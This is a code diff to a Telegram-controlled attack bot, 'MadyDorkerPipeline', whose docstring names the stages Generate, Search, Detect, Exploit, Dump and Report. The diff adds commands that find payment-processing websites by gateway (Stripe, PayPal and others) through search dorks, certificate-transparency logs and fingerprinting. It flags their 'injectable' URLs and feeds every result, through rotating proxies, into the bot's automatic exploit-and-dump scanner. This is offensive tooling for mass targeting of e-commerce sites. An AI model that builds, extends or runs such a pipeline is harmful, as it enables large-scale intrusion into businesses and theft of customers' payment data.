@@ -164,6 +164,13 @@ try:
 except ImportError:
     HAS_DORK_MUTATOR = False
 
+# v3.3 Payment site discovery
+try:
+    from payment_discovery import PaymentDiscovery, DiscoveredSite
+    HAS_PAYMENT_DISCOVERY = True
+except ImportError:
+    HAS_PAYMENT_DISCOVERY = False
+
 
 class MadyDorkerPipeline:
     """The main v3.1 pipeline: Generate → Search → Detect → Exploit → Dump → Report."""
@@ -184,6 +191,9 @@ class MadyDorkerPipeline:
         )
         # v3.2: Dork mutation engine for enhanced dork generation
         self.dork_mutator = DorkMutator() if HAS_DORK_MUTATOR else None
+
+        # v3.3: Payment site discovery engine
+        self.payment_discoverer = None  # Initialized after proxy_manager is set up
         
         self.searcher = MultiSearch(
             proxies=self._load_proxies(),
@@ -241,6 +251,15 @@ class MadyDorkerPipeline:
                         logger.info(f"   → {p.address}")
 
             self.searcher.proxy_manager = self.proxy_manager
+
+        # v3.3: Initialize payment discovery engine
+        if HAS_PAYMENT_DISCOVERY:
+            self.payment_discoverer = PaymentDiscovery(
+                proxy_manager=self.proxy_manager,
+                searcher=self.searcher,
+                max_concurrent=20,
+            )
+            logger.info("🎯 Payment Discovery Engine enabled")
 
         # Configure Firecrawl in search engine
         if self.config.firecrawl_enabled and self.config.firecrawl_api_key:
@@ -7375,6 +7394,189 @@ async def cmd_checkkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ Validation error: {e}")
 
 
+# ==================== PAYMENT DISCOVERY COMMANDS ====================
+
+# Global task handle for background payment discovery
+_pay_discover_task: Optional[asyncio.Task] = None
+
+
+async def cmd_paydiscover(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /paydiscover command — discover payment-processing sites and feed into scanner."""
+    if not await require_owner(update): return
+    global _pay_discover_task
+    
+    if not HAS_PAYMENT_DISCOVERY:
+        await update.message.reply_text("❌ payment_discovery module not available.")
+        return
+    
+    p = get_pipeline()
+    
+    if _pay_discover_task and not _pay_discover_task.done():
+        await update.message.reply_text("⚠️ Payment discovery already running! Use /paystop to cancel.")
+        return
+    
+    # Parse args: /paydiscover [methods] [gateways]
+    # e.g. /paydiscover dorks,ct stripe,paypal
+    methods = ["dorks", "ct", "tech"]
+    gateways = None
+    
+    if context.args:
+        if len(context.args) >= 1:
+            methods = [m.strip() for m in context.args[0].split(",")]
+        if len(context.args) >= 2:
+            gateways = [g.strip() for g in context.args[1].split(",")]
+    
+    # Create fresh discoverer
+    p.payment_discoverer = PaymentDiscovery(
+        gateways=gateways,
+        proxy_manager=p.proxy_manager,
+        searcher=p.searcher,
+        max_concurrent=20,
+    )
+    
+    chat_id = update.effective_chat.id
+    
+    async def _report(msg: str):
+        try:
+            await context.bot.send_message(chat_id=chat_id, text=msg, parse_mode="HTML")
+        except Exception:
+            pass
+    
+    async def _run_discovery():
+        try:
+            results = await p.payment_discoverer.run_full_discovery(
+                methods=methods,
+                report_callback=_report,
+            )
+            
+            if not results:
+                await _report("😕 No payment sites discovered.")
+                return
+            
+            # Feed discovered URLs into the pipeline for scanning
+            urls = p.payment_discoverer.get_all_urls()
+            injectable = p.payment_discoverer.get_injectable_urls()
+            
+            await _report(
+                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"  🎯 <b>Discovery → Scanner Pipeline</b>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                f"  💳 Payment sites: <b>{len(results)}</b>\n"
+                f"  🔗 Total URLs: <b>{len(urls)}</b>\n"
+                f"  💉 With params (injectable): <b>{len(injectable)}</b>\n\n"
+                f"  ⚡ Feeding into scanner pipeline now..."
+            )
+            
+            # Process each discovered URL through the pipeline scanner
+            batch_results = []
+            batch_findings = []
+            scanned = 0
+            found = 0
+            
+            for url in urls:
+                if not p.payment_discoverer._running and scanned > 0:
+                    break
+                try:
+                    await p._process_url_safe(url, batch_results, batch_findings)
+                    scanned += 1
+                    if batch_findings:
+                        new_found = len(batch_findings) - found
+                        found = len(batch_findings)
+                        if new_found > 0 and scanned % 10 == 0:
+                            await _report(
+                                f"⚡ Scanning {scanned}/{len(urls)}: "
+                                f"<b>{found}</b> findings so far"
+                            )
+                except Exception as e:
+                    logger.debug(f"[PayDiscover] Scan error for {url}: {e}")
+                
+            await _report(
+                f"✅ <b>Payment Discovery Scan Complete</b>\n\n"
+                f"🔍 Scanned: {scanned}/{len(urls)} sites\n"
+                f"🎯 Findings: {found}\n"
+                f"\n{p.payment_discoverer.get_stats_summary()}"
+            )
+            
+        except asyncio.CancelledError:
+            await _report("🛑 Payment discovery cancelled.")
+        except Exception as e:
+            logger.error(f"[PayDiscover] Error: {e}", exc_info=True)
+            await _report(f"❌ Discovery error: {e}")
+    
+    _pay_discover_task = asyncio.create_task(_run_discovery())
+    
+    await update.message.reply_text(
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"  🎯 <b>Payment Site Discovery Started</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"  Methods: <b>{', '.join(methods)}</b>\n"
+        f"  Gateways: <b>{', '.join(gateways) if gateways else 'All 13'}</b>\n\n"
+        f"  Phase 1: Dork discovery (payment JS includes)\n"
+        f"  Phase 2: CT log subdomain search\n"
+        f"  Phase 3: Technology fingerprint search\n"
+        f"  Phase 4: Auto-scan all discovered sites\n\n"
+        f"  Use /paystop to cancel | /paystats for progress",
+        parse_mode="HTML",
+    )
+
+
+async def cmd_paystop(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /paystop command — stop payment discovery."""
+    if not await require_owner(update): return
+    global _pay_discover_task
+    
+    p = get_pipeline()
+    if p.payment_discoverer:
+        p.payment_discoverer.stop()
+    
+    if _pay_discover_task and not _pay_discover_task.done():
+        _pay_discover_task.cancel()
+        await update.message.reply_text("🛑 Payment discovery stopping...")
+    else:
+        await update.message.reply_text("ℹ️ No payment discovery running.")
+
+
+async def cmd_paystats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /paystats command — show payment discovery stats."""
+    if not await require_owner(update): return
+    
+    p = get_pipeline()
+    if not p.payment_discoverer:
+        await update.message.reply_text("ℹ️ No payment discovery has been run yet.")
+        return
+    
+    d = p.payment_discoverer
+    running = "🟢 Running" if d._running else "🔴 Stopped"
+    
+    gw_lines = []
+    for gw, count in sorted(
+        d.stats["gateways_found"].items(),
+        key=lambda x: x[1], reverse=True
+    )[:15]:
+        gw_lines.append(f"  {gw}: <b>{count}</b>")
+    
+    top_sites = []
+    for site in sorted(d.discovered.values(), key=lambda s: s.confidence, reverse=True)[:10]:
+        top_sites.append(
+            f"  {'💉' if site.has_params else '🌐'} {site.domain} "
+            f"({site.gateway}, {site.confidence:.0%})"
+        )
+    
+    await update.message.reply_text(
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"  🎯 <b>Payment Discovery Stats</b> {running}\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"  💳 Sites found: <b>{d.found_count}</b>\n"
+        f"  🔍 Dork queries: {d.stats['dork_queries']}\n"
+        f"  📜 CT queries: {d.stats['ct_queries']}\n"
+        f"  🔎 HTML verified: {d.stats['html_scans']}\n"
+        f"  🔗 URLs checked: {d.stats['urls_checked']}\n\n"
+        f"<b>Gateway Breakdown:</b>\n" + ("\n".join(gw_lines) or "  (none yet)") +
+        f"\n\n<b>Top Sites:</b>\n" + ("\n".join(top_sites) or "  (none yet)"),
+        parse_mode="HTML",
+    )
+
+
 # ==================== REGISTRATION COMMANDS ====================
 
 async def cmd_register(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -7647,6 +7849,11 @@ def main(config: DorkerConfig = None):
     app.add_handler(CommandHandler("del", cmd_del, filters=chat_filter))
     app.add_handler(CommandHandler("skvalidate", cmd_skvalidate, filters=chat_filter))
     app.add_handler(CommandHandler("checkkey", cmd_checkkey, filters=chat_filter))
+
+    # Payment discovery commands
+    app.add_handler(CommandHandler("paydiscover", cmd_paydiscover, filters=chat_filter))
+    app.add_handler(CommandHandler("paystop", cmd_paystop, filters=chat_filter))
+    app.add_handler(CommandHandler("paystats", cmd_paystats, filters=chat_filter))
 
     # Registration / auth commands (no chat_filter — allow DMs)
     app.add_handler(CommandHandler("register", cmd_register))
